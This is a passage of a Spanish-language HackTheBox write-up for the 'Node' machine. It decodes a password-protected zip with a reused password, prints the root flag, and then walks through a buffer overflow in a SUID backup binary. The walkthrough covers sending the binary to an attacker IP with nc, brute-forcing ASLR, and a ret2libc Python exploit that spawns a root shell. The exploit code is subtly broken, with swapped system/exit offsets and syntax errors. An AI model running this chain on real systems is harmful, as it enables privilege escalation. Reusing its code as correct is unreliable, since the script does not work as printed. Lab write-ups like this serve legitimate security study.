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
</code></pre>

<p>Nos devuelve un resultado en base64, y si lo decodeamos obtenemos un archivo comprimido, y al unzipearlo nos pide ingresar una contraseña.</p>

<pre><code class="language-bash">❯ unzip file
Archive:  file
[file] root/.profile password: 
</code></pre>

<p>Podemos usar la que previamente obtuvimos con <code>fcrackzip</code> ya que se puede estar reutilizando la contraseña.</p>

<pre><code class="language-bash">❯ unzip file
Archive:  file
[file] root/.profile password: 
  inflating: root/.profile           
 extracting: root/.cache/motd.legal-displayed  
 extracting: root/root.txt           
  inflating: root/.bashrc            
  inflating: root/.viminfo           
 extracting: root/.nano/search_history  
❯ 
❯ ls
 root   file
</code></pre>

<p>Efectivamente logramos descomprimirlo usando la contraseña previa <code>magicword</code>, ahora podemos ver lo que hay dentro del directorio y encontramos la segunda flag <code>root.txt</code>.</p>

<pre><code class="language-bash">❯ cd root
❯ ls
 root.txt
❯ cat root.txt
98ef491742abffa14a62facb8d832818
</code></pre>

<h2 id="explotacion-alterna">EXPLOTACION ALTERNA  <a href="#explotacion-alterna">#</a></h2>

<p>Vimos anteriormente que pudimos leer la flag <code>root.txt</code>, pero no logramos obtener acceso como el usuario <code>root</code> al sistema. Anteriormente vimos que al binario <code>backup</code>, le pasabamos un parametro final correspondiente a un directorio, pero si tratamos de pasar muchos caracteres como ultimo parametro hacemos que el programa se corrompa.</p>

<pre><code class="language-bash">tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python -c 'print("A"*40000)')   
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python -c 'print("A"*40000)')
Segmentation fault (core dumped)
</code></pre>
<p>Vemos que se acontece un desbordamiento de buffer o <code>bufferoverflow</code>.</p>

<p>Vamos a traernos el binario a nuestro equipo.</p>

<pre><code class="language-bash">tom@node:/usr/local/bin$ nc 10.10.16.2 443 &lt; backup
nc 10.10.16.2 443 &lt; backup
</code></pre>

<p>Para ejecutarlo sin problemas, voy a crearme un directorio y el archivo donde se almacenan las keys.</p>

<pre><code class="language-bash">❯ mkdir /etc/myplace
❯ nvim /etc/myplace/keys
❯ cat /etc/myplace/keys
a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
</code></pre>

<p>Para poder ver los registros al ejecutar el binario a bajo nivel usare <code>gdb</code>.</p>

<pre><code class="language-bash">gef➤  r a 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python3 -c 'print("A"*3000)')
</code></pre>

<p><img src="/assets/images/HTB/htb-writeup-Node/node9.PNG" alt="" /></p>

<p>Vemos que se acontece el desbordamiento sobrescribiendo los registros y que alteran el flujo del programa, esto termina corrompiendolo cuando introducimos muchos caracteres capaces de sobrepasar el tamaño del buffer asignado.</p>

<p><img src="/assets/images/HTB/htb-writeup-Node/buff.png" alt="" /></p>

<p>Si quieres saber mas acerca de esto te dejo el siguiente articulo:</p>

<ul>
  <li><a href="https://keepcoding.io/blog/que-es-un-buffer-overflow/">https://keepcoding.io/blog/que-es-un-buffer-overflow/</a></li>
</ul>

<p>Lo que podriamos hacer es que el flujo del programa podemos meterlo en la pila, donde a traves de un shellcode podemos ejecutar comandos y otorgarnos una reverse shell.</p>

<p>Pero si vemos las protecciones del binario este cuenta con  <code>data execution prevention</code>. <code>NX</code>.</p>

<pre><code class="language-bash">gef➤  checksec
[+] checksec for '/home/fmiracle/Machines/Node/content/backup'
[*] .gef-2b72f5d0d9f0f218a91cd1ca5148e45923b950d5.py:L8764 'checksec' is deprecated and will be removed in a feature release. Use Elf(fname).checksec()
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
</code></pre>

<p>Asi que necesitamos buscar otra forma de explotar del binario. Podemos usar un <code>ret2libc</code> que lo que hace es aprovecharse la la libreria <code>libc</code> que el binario esta utilizando.</p>

<pre><code class="language-bash">tom@node:/usr/local/bin$ which backup | xargs ldd
which backup | xargs ldd
	linux-gate.so.1 =&gt;  (0xf7723000)
	libc.so.6 =&gt; /lib32/libc.so.6 (0xf7564000)
	/lib/ld-linux.so.2 (0xf7724000)
tom@node:/usr/local/bin$
</code></pre>

<p>Con ello en vez de mandar el flujo del programa a la pila, podemos usar el <code>libc</code> para ejecutar una llamada a nivel de sistema.</p>

<p>Para ello necesitamos primero saber si la maquina cuenta con <code>ÀSLR</code> <code>aleatorizacion de direcciones de la memoria</code>, ello podemos verificarlo leyendo.</p>

<pre><code class="language-bash">cat /proc/sys/kernel/randomize_va_space
2
</code></pre>

<p>Al tener un valor de 2, quiere decir que la maquina si cuenta con <code>ASLR</code>.</p>

<p>Otra forma de verlo seria usando la siguente expresión, donde podemos ver que efectivamente cuenta con <code>ASLR</code> al cambiar las direcciones.</p>

<pre><code class="language-bash">for i in $(seq 1 10); do which backup | xargs ldd | grep libc | awk 'NF{print $NF}' | tr -d '()'; done
&lt;ch backup | xargs ldd | grep libc | awk 'NF{print $NF}' | tr -d '()'; done  
0xf7553000
0xf752d000
0xf75a7000
0xf75bc000
0xf7579000
0xf7618000
0xf75ff000
0xf7613000
0xf7601000
0xf7556000
</code></pre>

<p>Pero pese a que exista <code>ASLR</code>, al no ser muy largas pueden repetirse, por tanto aunque sean aleatorios pueden volver a repetirse al haber una colision, podemos burlar el <code>ASLR</code>.</p>

<pre><code class="language-bash">for i in $(seq 1 1000); do which backup | xargs ldd | grep libc | awk 'NF{print $NF}' | tr -d '()' | grep 0xf752d000; done; break 
&lt;grep libc | awk 'NF{print $NF}' | tr -d '()' | grep 0xf752d000; done; break 
0xf752d000
0xf752d000
0xf752d000
bash: break: only meaningful in a `for', `while', or `until' loop
</code></pre>

<p>Ahora para poder ejecutar un <code>ret2lib</code> y poder ejecutar una llamada a nivel de sistema necesitaremos:</p>

<ul>
  <li>La dirección de system</li>
  <li>La dirección de exit</li>
  <li>La dirección de la cadena <code>/bin/sh</code></li>
</ul>

<p>Basicamente lo que queremos lograr es <code>os.system("/bin/sh")</code> y al ser el binario <code>suid</code> lo hara como <code>root</code> y ganaremos acceso como este usuario.</p>

<p>Para ello primero debemos de saber de las <code>A</code> que insertamos antes cuantas debemos insertar para tener control del registro <code>eip</code>. Para lo cual podemos usar <code>pattern create</code> y generar un numero de cadena aleatoria.</p>

<pre><code class="language-bash">gef➤  pattern create 1000
[+] Generating a pattern of 1000 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj
[+] Saved as '$_gef0'
gef➤  
</code></pre>

<p>Insertamos la cadena generada.</p>

<p><img src="/assets/images/HTB/htb-writeup-Node/node10.PNG" alt="" /></p>

<p>Y ahora con <code>pattern offset</code> podemos saber cual es el limite para sobreescribir <code>eip</code>.</p>

<pre><code class="language-bash">gef➤  patter offset $eip
[+] Searching for '$eip'
[+] Found at offset 512 (little-endian search) likely
[+] Found at offset 320 (big-endian search)
</code></pre>

<p>Vemos que necesitamos <code>512</code> caracteres antes de sobrescribir <code>eip</code>. Verificamos con la ayuda de python imprimiendo <code>512 A</code> y adicionamos <code>4 B</code>, que como resultado ahora el registro <code>eip</code> valdria <code>BBBB</code>.</p>

<p><img src="/assets/images/HTB/htb-writeup-Node/node11.PNG" alt="" /></p>

<p>Ahora que sabemos el offset lo siguiente sera encontrar las direcciones de system, exit y sh. Y para ello primero vamos a coger una dirección base de libc, puede ser cualquiera <code>0xf752d000</code>.</p>

<p>Teniendo esto podemos ir armandonos un script en python. Donde primero especificamos el offset de caracteres, debemos encontrar primero los offsets de las direcciones de <code>system, exit y binsh</code>. Ya que una vez tengamos estos podamos obtener las direcciones reales de estas usando la <code>libc_base + los offsets</code> de cada una.</p>

<p>Y usamos pack para representar las direcciones en <code>litelediam</code> y evitar darle la vuelta a las direcciones.</p>

<pre><code class="language-python">#!/usr/bin/python3


from struct import pack

offset = 512

junk = "A"*offset

#ret2lib - EIP  -&gt; system -&gt; exit -&gt; /bin/sh

libc_base_add = 0xf752d000

system_add_offset = 

exit_add_offset = 

binsh_add_offset = 


system_add_real = pack("&lt;I", libc_base_add + system_add_offset )

exit_add_real = pack("&lt;I", libc_base_add + exit_add_offset)

binsh_add_real = pack("&lt;I"), libc_base_add + binsh_add_offset)


payload = junk + system_add_real + exit_add_real + binsh_add_real
</code></pre>

<p>Finalmente como payload deberiamos pasarle el junk sumado mas las direcciones reales de system, exit y binsh.</p>

<p>Ahora para conseguir los offset, primero usaremos <code>readelf</code> para las direcciones de <code>system y exit</code>.</p>

<pre><code class="language-bash">readelf -s /lib32/libc.so.6 | grep -E " system@@| exit@@"
&lt;adelf -s /lib32/libc.so.6 | grep -E " system@@| exit@@"                     
   141: 0002e7b0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
  1457: 0003a940    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
</code></pre>

<p>Y para obtener el offset de binsh, podemos usar <code>strings</code> con los siguientes parametros:</p>

<pre><code class="language-bash">strings -a -t x /lib32/libc.so.6 | grep "/bin/sh"
 15900b /bin/sh
</code></pre>

<p>Ahora solo debemos correr el programa multiples veces, para causar una colision en las direcciones hasta que <code>libc</code> valga lo que ejecutamos en el script.</p>

<pre><code class="language-python">#!/usr/bin/python3


from struct import pack

offset = 512

junk = "A"*offset

#ret2lib - EIP  -&gt; system -&gt; exit -&gt; /bin/sh

libc_base_add = 0xf752d000

system_add_offset = 0x0002e7b0

exit_add_offset = 0x0003a940

binsh_add_offset = 0x0015900b

system_add_real = pack("&lt;I", libc_base_add + system_add_offset )

exit_add_real = pack("&lt;I", libc_base_add + exit_add_offset)

binsh_add_real = pack("&lt;I"), libc_base_add + binsh_add_offset)


payload = junk + system_add_real + exit_add_real + binsh_add_real

print(payload)
</code></pre>

<p>Ejecutamos el exploit multiples veces y se ejecuta la <code>/bin/sh</code> y ganamos acceso como el usuario <code>root</code>, ahora solo debemos dirigirnos al directorio personal del usuario <code>root</code> y visualizar la segunda flag <code>root.txt</code>.</p>

<pre><code class="language-bash">while true; do backup a 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python exploit.py); done
</code></pre>

<pre><code class="language-bash"># whoami
root
#cd /root
cat root.txt
98ef491742abffa14a62facb8d832818
</code></pre>


</div>

<!-- Rating -->


<!-- Author Box if enabled from _config.yml -->
<!-- Author Box -->




<!-- Comments if not disabled with comments: false -->
<!-- Comments
================================================== -->
 
<div class="comments">
    <button class="btn btn-dark show-comments">Comentarios</button>         
    <div id="comments">  
        <h4 class="mb-4">Comments</h4>                 
            <section class="disqus">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
        var disqus_shortname = 'demowebsite'; 
        var disqus_developer = 0;
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</section>
     
    <div class="clearfix"></div>              
    </div>    
</div>       



<!-- Share -->
<div class="share">
    <p>
        ⚉
    </p>
    <ul>
        <li class="ml-1 mr-1">
            <a target="_blank" href="https://twitter.com/intent/tweet?text=Maquina Node - htb writeup&url=http://localhost:4000/hackthebox/htb-writeup-Node" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
                <i class="fab fa-twitter"></i>
            </a>
        </li>

        <li class="ml-1 mr-1">
            <a target="_blank" href="https://www.hackthebox.eu/profile/1014319" onclick="window.open(this.href, 'width=550,height=435');return false;">
                <i class="fas fa-cube"></i>
            </a>
        </li>

        <li class="ml-1 mr-1">
            <a target="_blank" href="https://github.com/Firtsmiracle" onclick="window.open(this.href, 'width=550,height=435');return false;">
                <i class="fab fa-github"></i>
            </a>
        </li>

    </ul>
</div>


<!-- Related Post -->


<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
https://search.google.com/structured-data/testing-tool/u/0/
================================================== -->


    </div>

    
    
</div>

<!-- Begin Footer
================================================== -->
<footer class="footer">
    <div class="container">
        <div class="row">
            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Jekyll Theme by</a> WowThemes.net
            </div>
        </div>
    </div>
</footer>
<!-- End Footer
================================================== -->

</div> <!-- /.site-content -->

<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
================================================== -->

<script src="/assets/js/prism.js"></script>

<script src="/assets/js/theme.js"></script>




<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>


<!-- Bootstrap and images ZOOM feature
================================================== -->
<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>

</body>
</html>
